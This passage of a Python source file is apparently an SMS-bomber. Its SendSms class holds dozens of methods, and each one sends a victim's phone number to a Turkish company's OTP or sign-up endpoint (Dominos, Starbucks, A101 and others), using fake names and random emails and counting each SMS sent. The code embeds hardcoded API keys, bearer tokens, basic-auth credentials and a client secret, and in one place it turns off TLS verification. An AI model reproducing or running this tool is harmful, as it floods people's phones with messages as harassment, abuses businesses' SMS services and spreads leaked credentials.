            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.4.0", "Client-Device": "IOS", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json_data: Dict[str, Any] = {"phone": self.phone}
            r = requests.post(url=url, json=json_data, headers=headers, timeout=6)
            if r.json()["isSuccess"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #happy.com.tr
    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
            data = {"telephone": self.phone}
            r = requests.post(url=url, data=data, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    

    #komagene.com.tr
    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            json_data: Dict[str, Any] = {"Telefon": self.phone,"FirmaId": "32"}
            headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
            r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
            if r.json()["Success"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #kuryemgelsin.com
    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            json_data: Dict[str, Any] = {"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url=url, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json_data: Dict[str, Any] = {"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json_data, headers=headers, timeout=6)
            if r.json()["status"]== "success":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            
    
    #taksim.digital
    def Taksim(self):
        try:
            url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
            json_data: Dict[str, Any] = {"countryPhoneCode": "+90", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"}
            r = requests.post(url=url, headers=headers, json=json_data, timeout=6)
            if r.json()["success"]== True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            json_data: Dict[str, Any] = {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
            r = requests.post(url=url, json=json_data, timeout=6)
            if r.json()["Result"]== True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #tasimacim.com
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json_data: Dict[str, Any] = {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #toptanteslim.com
    def ToptanTeslim(self):
        try:
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "Mode": "no-cors", "U": "e-ticaret", "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
            json_data: Dict[str, Any] = {"ADRES": "ZXNlZGtm", "DIL": "tr_TR", "EPOSTA": self.mail, "EPOSTA_BILDIRIM": True, "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", "ISLEM": "KayitOl", "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", "KIMLIKNO": None, "KULLANICI_ADI": "Memati", "KULLANICI_SOYADI": "Bas", "PARA_BIRIMI": "TL", "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", "POSTAKODU": "377777", "SEHIR": "\xc4\xb0STANBUL", "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", "SMS_BILDIRIM": True, "TELEFON": self.phone, "TICARI_UNVAN": "kdkd", "ULKE_ID": 1105, "VERGI_DAIRESI": "sjje", "VERGI_NU": ""}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["Durum"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json_data: Dict[str, Any] = {"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json_data: Dict[str, Any] = {"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "", "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #yilmazticaret.net
    def YilmazTicaret(self):
        try:
            url = "http://www.yilmazticaret.net:80/restapi2/register/"
            headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
            data = {"telefon": (None, f"0 {self.phone}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
            r = requests.post(url, headers=headers,  data=data, timeout=6)
            if r.json()["giris"] == "success":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
    
    
    #yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json_data: Dict[str, Any] = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json_data, timeout=6)
            if r.json()["success"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False
            

    #beefull.com
    def  Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json_data: Dict[str, Any] = {"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
            requests.post(url, json=json_data, timeout=4)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json_data = {"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json_data, timeout=4)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #starbucks.com.tr
    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            headers = {"Content-Type": "application/json", "Operationchannel": "ios", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br"}
            json_data: Dict[str, Any] = {"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": self.mail, "preferredName": "Memati"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["code"] == 50:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #dominos.com.tr
    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
            json_data: Dict[str, Any] = {"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["isSuccess"] == True:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #baydoner.com
    def Baydoner(self):
        try:
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            headers = {"Content-Type": "application/json", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.9", "Platform": "1", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
            json_data: Dict[str, Any] = {"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": self.mail, "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["Control"] == 1:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #pidem.com.tr
    def Pidem(self):
        try:
            url = "https://restashop.azurewebsites.net:443/graphql/"
            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
            json_data: Dict[str, Any] = {"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False


    #frink.com.tr
    def Frink(self):
        try:
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json_data: Dict[str, Any] = {"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json()["processStatus"] == "SUCCESS":
                self.adet += 1
                return True
            else:
                return False
        except:
            return False

    #a101
    def a101(self):
        try:
         url = "https://www.a101.com.tr/users/otp-login/"
         payload: Dict[str, Any] = {
             "phone" : f"0{self.phone}"
         }
         r = requests.post(url=url, json=payload, timeout=5)
         if r.status_code == 200:
             self.adet += 1
             return True
         else:
             return False
        except:
             return False


    #bodrum.bel.tr
    def Bodrum(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", }
            json_data: Dict[str, Any] = {"gsm": "+90"+self.phone, "source": "orwi"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        except:
            return False

    #defacto
    def defacto(self):
      try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload: Dict[str, Any] = {
            "mobilePhone" : f"0{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #ikinciyeni
    def ikinciyeni(self):
      try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload: Dict[str, Any] = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "lastName": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
            "phone": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSucceed"]

        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #ceptesok
    def ceptesok(self):
      try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload: Dict[str, Any] = {
            "mobile_number.phone": f"{self.phone}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
      except:
         return False

    #pisir
    def pisir(self):
      try:
        url = "https://api.pisir.com/v1/login/"
        payload: Dict[str, Any] = {"msisdn": f"90{self.phone}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            self.adet += 1
            return True
        else:
            return False
      except:
          return False

    #coffy
    def coffy(self):
      try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload: Dict[str, Any] = {"phonenumber": f"+90{self.phone}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #sushico
    def sushico(self):
      try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload: Dict[str, Any] = {"phone": f"+90{self.phone}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #kalmasin
    def kalmasin(self):
      try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload: Dict[str, Any] = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #yotto
    def yotto(self):
      try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload: Dict[str, Any] = {
            "phone" : f"+90 ({str(self.phone)[0:3]}) {str(self.phone)[3:6]}-{str(self.phone)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #aygaz
    def aygaz(self):
      try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload: Dict[str, Any] = {
            "Gsm" : f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #pawapp
    def pawapp(self):
      try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload: Dict[str, Any] = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{self.phone}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #mopas
    def mopas(self):
      try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobilenumber={self.phone}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=5)
            
            if r1.status_code == 200:
                self.adet += 1
                return True
            else:
                return False
        else:
            return False
      except:
        return False
                

    #ninewest
    def ninewest(self):
      try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload: Dict[str, Any] = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phonenumber" : f"({str(self.phone)[0:3]}) {str(self.phone)[3:6]} {str(self.phone)[6:8]} {str(self.phone)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #saka
    def saka(self):
     try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload: Dict[str, Any] = {
            "gsm" : f"0{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #superpedestrian
    def superpedestrian(self):
      try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload: Dict[str, Any] = {
            "phone_number" : f"+90{str(self.phone)[0:3]} {str(self.phone)[3:6]} {str(self.phone)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            self.adet += 1
            return True
        else:
            return False
      except:
        return False

    #gofody -- execute.submit burdan devam
    def gofody(self):
     try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload: Dict[str, Any] = {
            "country_code": "90",
            "phone": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #weescooter
    def weescooter(self):
     try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload: Dict[str, Any] = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #scooby
    def scooby(self):
     try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phonenumber=90{self.phone}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #gez
    def gez(self):
     try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{self.phone}" # Fixed: changed self to self.phone
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #heyscooter
    def heyscooter(self):
     try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #jetle
    def jetle(self):
     try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={self.phone}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #rabbit
    def rabbit(self):
     try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload: Dict[str, Any] = {
            "mobile_number" : f"+90{self.phone}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #roombadi
    def roombadi(self):
     try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload: Dict[str, Any] = {"phone": f"{self.phone}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #hizlieczaza
    def Hizliecza2(self): # Renamed to avoid conflict
     try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload: Dict[str, Any] = {"phonenumber": f"+90{self.phone}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #signalall
    def signalall(self):
     try:
        url = "https://appservices.huzk.com/client/register"
        payload: Dict[str, Any] = {
            "name": "",
            "phone": {
                "number": f"{self.phone}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #goyakit
    def goyakit(self):
     try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #pinar
    def pinar(self):
     try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload: Dict[str, Any] = {
            "MobilePhone" : f"{self.phone}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == "true": # Changed to check string "true"
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #oliz
    def oliz(self):
     try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload: Dict[str, Any] = {
            "mobile_number" : f"{self.phone}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #marti
    def marti(self):
     try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload: Dict[str, Any] = {
            "mobilePhone" : f"{self.phone}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #karma
    def karma(self):
     try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload: Dict[str, Any] = {
            "phonenumber" : f"90{self.phone}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #hoplagit
    def hop(self):
     try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload: Dict[str, Any] = {
            "phone" : f"+90{self.phone}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #anadolu
    def anadolu(self):
     try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": f"{str(self.phone)[0:3]}{str(self.phone)[3:6]}{str(self.phone)[6:8]}{str(self.phone)[8:10]}"
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #total
    def total(self):
     u3.disable_warnings(InsecureRequestWarning)
     try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #englishhome
    def englishhome(self):
     try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload: Dict[str, Any] = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{self.phone}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #petrolofisi
    def petrolofisi(self):
     try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload: Dict[str, Any] = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{self.phone}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            self.adet += 1
            return True
        else:
            return False
     except:
        return False

    #SON


servisler_sms: List[str] = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
